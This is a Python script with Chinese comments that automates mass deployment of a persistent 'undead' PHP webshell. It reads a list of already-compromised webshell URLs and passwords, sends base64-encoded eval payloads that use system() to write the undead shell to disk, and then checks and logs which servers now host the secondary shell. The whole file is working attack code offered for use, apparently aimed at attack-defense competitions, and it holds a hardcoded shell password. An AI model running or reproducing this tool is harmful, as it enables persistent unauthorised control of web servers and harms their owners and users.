#!/usr/bin/python
#coding=utf-8
# 需要修改的地方：
# upload_file--要上传的不死马文件
# shellpath--服务器生成的不死马路径
# webshell--不死马生成的小马文件名

import sys,requests,base64,re

def loadfile(filepath):
	try : 
		file = open(filepath,"rb")
		content = str(file.read())
		file.close()
		return content
	except : 
		print "File %s Not Found!" %filepath
		sys.exit()

def file_write(filepath,filecontent):
	file = open(filepath,"a")
	file.write(filecontent)
	file.close()

def postshell(url,method,passwd):
	#print url
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=3)
	except : 
		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
		return 0
	if res.status_code!=200 :
		print "[-] %s Page Not Found!" %url
		return 0
	# *****************************************************************************************
	# 注意修改反弹shell的 IP和Port
	upload_file = "./1.undead.php"
	#upload_file = "./2.phpshell.php"
	shellpath = "undead.php"
	webshell = "conf.bak.php"
	# *****************************************************************************************
	#执行命令 system, shell_exec, passthru, exec, popen, `, proc_open
	shellcode = base64.b64encode(loadfile(upload_file))
	getshell_cmd = "system('echo %s | base64 -d > %s');" %(shellcode,shellpath)
	data={}
	# 用get或post方式模拟菜刀上传文件
	if method=='get':
		# define your special password as pass
		data['pass']='elliot@123'
		data[passwd]='@eval(base64_decode($_GET[z0]));'
		data['z0']=base64.b64encode(getshell_cmd)
		res = requests.get(url,params=data,timeout=2)
		
	elif method=='post':
		# define your special password as pass
		data['pass']='elliot@123'
		data[passwd]='@eval(base64_decode($_POST[z0]));'
		data['z0']=base64.b64encode(getshell_cmd)
		res = requests.post(url,data=data,timeout=2)
		
	# 获取上传的大马路径
	pwd_path = re.findall(r'(http://.*\/+)', url)[0] + shellpath
	try :
		generate_webshell = requests.get(pwd_path,timeout=2)
		print "%s   upload Failed!"%pwd_path
		return 
	except requests.exceptions.ReadTimeout:
		pass
	except Exception:
		print "%s  something goes WRONG!" %pwd_path
	# 获取新生成的小马路径
	pwd_path1 = re.findall(r'(http://.*\/+)', pwd_path)[0] + webshell
	verify = requests.get(pwd_path1,timeout=2)
	if verify.status_code==200:
		print "%s  webshell generated!" %pwd_path1
		file_write("./Wowoooo!!!.txt", "%s  webshell generated!\n" %pwd_path1)
	else:
		print "%s  webshell NOT work!" %pwd_path1

if __name__ == '__main__':
	#存放webshell的文件
	shellstr=loadfile("./webshell.txt")
	list = shellstr.split("\r\n")
	#print str(list)
	i = 0
	url={}
	passwd={}
	method={}
	for data in list:
		if data:
			ls = data.split(",")
			method_tmp = str(ls[1])
			method_tmp = method_tmp.lower()
			if method_tmp=='post' or method_tmp=='get':
				url[i]=str(ls[0])
				method[i]=method_tmp
				passwd[i]=str(ls[2])
				i+=1
			else :
				print "[-] %s request method error!" %(str(ls[0]))
		else : 
			pass

	for j in range(len(url)):
		#调用执行命令的模块
		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
		postshell(url=url[j],method=method[j],passwd=passwd[j])
	file_write("./Wowoooo!!!.txt","\n\n")
	print "All Finished!"
